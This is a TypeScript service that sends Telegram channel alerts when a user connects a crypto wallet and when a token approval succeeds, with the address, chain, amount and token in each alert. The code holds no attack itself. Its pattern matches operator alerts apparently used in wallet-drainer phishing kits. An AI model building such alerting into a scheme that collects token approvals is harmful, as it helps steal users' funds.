// =================================
// 📱 Telegram Bot Notification Service
// =================================

import { getTelegramConfig } from "./env-validation";

interface TelegramMessage {
  text: string;
  parse_mode?: "HTML" | "Markdown";
  disable_web_page_preview?: boolean;
}

interface WalletConnectNotification {
  walletType: string;
  chain: string;
  userAddress: string;
  timestamp: string;
}

interface ApproveSuccessNotification {
  walletType: string;
  chain: string;
  userAddress: string;
  amount: string;
  token: string;
  timestamp: string;
}

class TelegramService {
  private config = getTelegramConfig();

  /**
   * Send a message to the configured Telegram channel
   */
  private async sendMessage(message: TelegramMessage): Promise<boolean> {
    if (!this.config.isEnabled) {
      console.log("📱 Telegram notifications are disabled");
      return false;
    }

    try {
      const url = `https://api.telegram.org/bot${this.config.token}/sendMessage`;
      const payload = {
        chat_id: this.config.channelId,
        ...message,
      };

      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorData = await response.json();
        console.error("❌ Telegram API error:", errorData);
        return false;
      }

      console.log("✅ Telegram message sent successfully");
      return true;
    } catch (error) {
      console.error("❌ Failed to send Telegram message:", error);
      return false;
    }
  }

  /**
   * Send wallet connection notification
   */
  async notifyWalletConnect(data: WalletConnectNotification): Promise<boolean> {
    const message = `🔗 <b>Wallet Connected</b>

💰 <b>Wallet:</b> ${data.walletType}
🌐 <b>Chain:</b> ${data.chain}
👤 <b>Address:</b> <code>${data.userAddress}</code>
⏰ <b>Time:</b> ${data.timestamp}

#WalletConnect #${data.chain} #${data.walletType}`;

    return this.sendMessage({
      text: message,
      parse_mode: "HTML",
    });
  }

  /**
   * Send approve success notification
   */
  async notifyApproveSuccess(
    data: ApproveSuccessNotification
  ): Promise<boolean> {
    const message = `✅ <b>Token Approval Successful</b>

💰 <b>Wallet:</b> ${data.walletType}
🌐 <b>Chain:</b> ${data.chain}
👤 <b>Address:</b> <code>${data.userAddress}</code>
💎 <b>Amount:</b> ${data.amount} ${data.token}
⏰ <b>Time:</b> ${data.timestamp}

#ApprovalSuccess #${data.chain} #${data.token}`;

    return this.sendMessage({
      text: message,
      parse_mode: "HTML",
    });
  }

  /**
   * Send custom notification
   */
  async sendCustomNotification(
    title: string,
    content: string,
    tags: string[] = []
  ): Promise<boolean> {
    const tagString =
      tags.length > 0 ? `\n\n${tags.map((tag) => `#${tag}`).join(" ")}` : "";

    const message = `📢 <b>${title}</b>

${content}${tagString}`;

    return this.sendMessage({
      text: message,
      parse_mode: "HTML",
    });
  }

  /**
   * Check if Telegram service is enabled
   */
  isEnabled(): boolean {
    return this.config.isEnabled;
  }

  /**
   * Get current configuration
   */
  getConfig() {
    return this.config;
  }
}

// Export singleton instance
export const telegramService = new TelegramService();

// Export types for external use
export type { WalletConnectNotification, ApproveSuccessNotification };
